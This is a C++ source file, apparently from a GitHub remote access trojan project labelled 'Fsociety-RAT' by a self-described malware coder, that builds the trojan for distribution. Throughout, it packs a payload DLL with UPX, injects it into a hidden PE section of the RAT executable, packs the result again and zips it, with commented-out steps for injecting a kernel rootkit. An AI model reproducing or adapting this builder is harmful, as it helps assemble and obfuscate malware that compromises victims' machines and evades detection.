/*
##################################################
#                                                #
#         Malware Coder: Elliot Alderson         #
#                                                #
#   Github: https://github.com/ElliotAlderson51  #
#                                                #
##################################################
*/

#include <iostream>
#include <Windows.h>

#define UNLEN 256 // User Name Length

bool FileExists(const std::string& path)
{
    DWORD dwAttribute = GetFileAttributesA(path.c_str());
    if (dwAttribute != INVALID_FILE_ATTRIBUTES && !(dwAttribute & FILE_ATTRIBUTE_DIRECTORY))
        return true;
    return false;
}

int main()
{
    std::string rootkit_section_name = ".msvcjmc";
    std::string dll_section_name = ".00cfg";

    std::string path = "D:\\Project\\rat\\Fsociety-RAT\\";
    std::string final_folder = path + "Final\\";
    std::string current_path = "";
    std::string section_injector = path + "Release\\Section_Injector.exe";
    
    std::string RAT = "";
    //std::string Rootkit = "";
    std::string DLL = "";

    std::cout << "Debug: 1\nRelease: 2:\n> ";
    
    int option;
    std::cin >> option;

    if (option == 1) // Debug
    {
        rootkit_section_name = "rootkit";
        dll_section_name = "dll";

        RAT = path + "Debug\\meta.exe";
        //Rootkit = path + "Debug\\Rootkit_32bit.sys";
        DLL = path + "Debug\\bench.dll";
        current_path = path + "Debug\\";
    }
    else if (option == 2) // Release
    {
        RAT = path + "Release\\meta.exe";
        //Rootkit = path + "Release\\Rootkit_32bit.sys";
        DLL = path + "Release\\bench.dll";
        current_path = path + "Release\\";
    }
    else
    {
        std::cout << "Invalid option...\n";
        return 0;
    }
    
    if (! FileExists(section_injector))
    {
        std::cout << "Section_Injector.exe not found...\n";
        return 0;
    }

    if (! FileExists(RAT))
    {
        std::cout << "meta.exe not found...\n";
        return 0;
    }
    
    /*
    if (! FileExists(Rootkit))
    {
        std::cout << "Rootkit not found...\n";
        return 0;
    }
    */

    if (! FileExists(DLL))
    {
        std::cout << "bench.dll not found...\n";
        return 0;
    }

    
    DeleteFileA((final_folder + "meta.exe").c_str());
    DeleteFileA((final_folder + "bench.dll").c_str());
    if (! CopyFileA(RAT.c_str(), (final_folder + "meta.exe").c_str(), FALSE))
    {
        std::cout << "Failed to copy meta.exe...\n";
        return 0;
    }
    
    if (!SetCurrentDirectoryA(current_path.c_str())) {
        std::cout << "Failed to set the current directory to \'" + current_path + "\'\n";
        return 0;
    }

    std::string upx_command = "upx.exe \"" + DLL + "\" -o \"" + final_folder + "bench.dll\"";
    system(upx_command.c_str());
    Sleep(2000);

    if (! FileExists(final_folder + "bench.dll"))
    {
        std::cout << "Failed to copy bench.dll...\n";
        return 0;
    }
    
    if (! SetCurrentDirectoryA((path + "Release").c_str()))
    {
        std::cout << "Failed to set current directory to \'" + path + "Release\'\n";
        return 0;
    }
    
    //std::string inject_rootkit = "Section_Injector.exe " + rootkit_section_name + " \"" + final_folder + "RAT.exe\" \"" + Rootkit + "\"";
    //std::cout << "Rootkit:\n\n" << inject_rootkit << "\n\n";
    //system(inject_rootkit.c_str());
    //Sleep(1000);

    std::string str_injection = "section_injector.exe " + dll_section_name + " \"" + final_folder + "meta.exe\" \"" + final_folder + "bench.dll" + "\"";

    std::cout << "Injecting DLL: " << str_injection << "\n";

    system(str_injection.c_str());
    Sleep(1000);

    if (! FileExists(final_folder + "meta.exe"))
    {
        std::cout << "Failed to inject DLL...\n";
        return 0;
    }

    if (FileExists(final_folder + "meta1.exe"))
    {
        DeleteFileA((final_folder + "meta1.exe").c_str());
        std::cout << "Deleted meta1.exe...\n";
    }

    if (!SetCurrentDirectoryA(current_path.c_str())) {
        std::cout << "Failed to set the current directory to \'" + current_path + "\'\n";
        return 0;
    }

    std::string upx_command_2 = "upx.exe \"" + final_folder + "meta.exe\" -o \"" + final_folder + "meta1.exe\"";
    std::cout << "UPXing meta.exe: " << upx_command_2 << "\n";
    system(upx_command_2.c_str());
    Sleep(2000);

    if (! FileExists(final_folder + "meta1.exe"))
    {
        std::cout << "Failed to UPX meta.exe...\n";
        return 0;
    }

    if (FileExists(final_folder + "meta1.zip"))
    {
        DeleteFileA((final_folder + "meta1.zip").c_str());
        std::cout << "Deleted meta1.zip...\n";
    }

    std::string zip_command = "powershell Compress-Archive -Path \"" + final_folder + "meta1.exe\" -DestinationPath \"" + final_folder + "meta1.zip\" -Force";
    std::cout << "Compressing meta1.exe to meta1.zip: " << zip_command << "\n";
    system(zip_command.c_str());
    Sleep(2000);

    if (!FileExists(final_folder + "meta1.zip"))
    {
        std::cout << "Failed to compress meta1.exe to meta1.zip...\n";
        return 0;
    }

    std::cout << "Done!\n";

    return 0;
}